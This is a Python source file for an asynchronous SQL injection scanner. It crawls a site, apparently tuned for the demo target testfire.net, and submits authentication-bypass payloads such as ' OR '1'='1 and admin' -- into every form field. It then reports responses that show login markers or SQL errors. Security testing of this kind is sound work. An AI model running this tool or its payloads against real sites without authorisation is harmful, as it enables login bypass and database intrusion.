import aiohttp
import asyncio
import time
import re
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs

# --- CONFIGURATION ---
MAX_PAGES = 10
CONCURRENT_REQUESTS = 5
# Specific indicators for testfire.net and general SQL errors
SUCCESS_INDICATORS = ["btnSignOff", "Sign Off", "Logged in as", "sql syntax", "mysql", "syntax error"]
PAYLOADS = ["' OR '1'='1", "admin' --", "' OR 1=1 --"]


# ---------------- HELPERS ---------------- #

def check_vulnerability(text):
    """Returns True if any success indicator is found in the response."""
    return any(indicator.lower() in text.lower() for indicator in SUCCESS_INDICATORS)


async def fetch(session, url, method="get", params=None, data=None):
    """Standardized async request handler for the scanner logic."""
    try:
        if method.lower() == "post":
            async with session.post(url, data=data, timeout=10) as r:
                return await r.text(errors="replace")
        else:
            async with session.get(url, params=params, timeout=10) as r:
                return await r.text(errors="replace")
    except:
        return ""


# ---------------- CRAWLER ---------------- #

async def crawl(session, start_url):
    """
    Finds pages on the same domain.
    Includes the specific testfire.net shortcuts from your preferred logic.
    """
    visited = {start_url}
    domain = urlparse(start_url).netloc

    # Force add known vulnerable paths for testfire.net
    if "testfire.net" in domain:
        visited.add(urljoin(start_url, "/login.jsp"))
        visited.add(urljoin(start_url, "/search.aspx"))

    try:
        html = await fetch(session, start_url)
        soup = BeautifulSoup(html, "html.parser")
        for a in soup.find_all("a", href=True):
            full_url = urljoin(start_url, a['href'])
            if urlparse(full_url).netloc == domain and len(visited) < MAX_PAGES:
                visited.add(full_url)
    except:
        pass
    return visited


# ---------------- CORE SCANNER ---------------- #

async def scan_page(session, url, results):
    """The testing logic you requested, converted to async."""
    html = await fetch(session, url)
    if not html:
        return

    # Check for existing indicators (Baseline check to avoid False Positives)
    if check_vulnerability(html):
        return

    soup = BeautifulSoup(html, "html.parser")
    forms = soup.find_all("form")

    for form in forms:
        action = urljoin(url, form.get("action"))
        method = form.get("method", "get").lower()
        # Extract input names (excluding submits)
        inputs = [i.get("name") for i in form.find_all("input") if i.get("name") and i.get("type") != "submit"]

        if not inputs:
            continue

        for payload in PAYLOADS:
            test_data = {i: payload for i in inputs}

            # Execute the test
            if method == "post":
                resp_text = await fetch(session, action, method="post", data=test_data)
            else:
                resp_text = await fetch(session, action, method="get", params=test_data)

            # Verify if the payload triggered a vulnerability
            if check_vulnerability(resp_text):
                results.append({
                    "type": f"Form-Based SQLi ({method.upper()})",
                    "url": action,
                    "parameter": str(inputs),
                    "payload": payload
                })
                break  # Move to next form after finding a vulnerability


# ---------------- BACKEND ENTRY POINT ---------------- #

async def run_scanner(start_url):
    """Coordinates the crawl and the concurrent scanning tasks."""
    results = []
    connector = aiohttp.TCPConnector(ssl=False)
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/119.0.0.0"}

    async with aiohttp.ClientSession(headers=headers, connector=connector) as session:
        # 1. Discover Pages
        pages = await crawl(session, start_url)

        # 2. Run Scan Tasks Concurrently
        tasks = [scan_page(session, page, results) for page in pages]
        await asyncio.gather(*tasks)

    return results


def scan_sql_injection(url):
    """
    The main wrapper function for your backend.
    Maintains the seamless return format for your frontend.
    """
    if not url.startswith("http"):
        url = "http://" + url

    # Run the async loop
    findings = asyncio.run(run_scanner(url))

    # Return exactly what your frontend expects
    if findings:
        return {
            "vulnerable": True,
            "findings_count": len(findings),
            "findings": findings,
            "detail": f"Found {len(findings)} potential SQL injection point(s)"
        }
    else:
        return {
            "vulnerable": False,
            "findings_count": 0,
            "findings": [],
            "detail": "No SQL injection indicators detected"
        }


if __name__ == "__main__":
    # For local testing purposes
    target = input("Enter target URL: ").strip()
    report = scan_sql_injection(target)

    print("\n" + "=" * 70)
    print("                         SQLi AUDIT REPORT")
    print("=" * 70)
    print(f" FINAL STATUS: {report['detail']}")
    if report['vulnerable']:
        for i, f in enumerate(report['findings'], 1):
            print(f" [{i}] {f['type']} at {f['url']}")
    print("=" * 70)
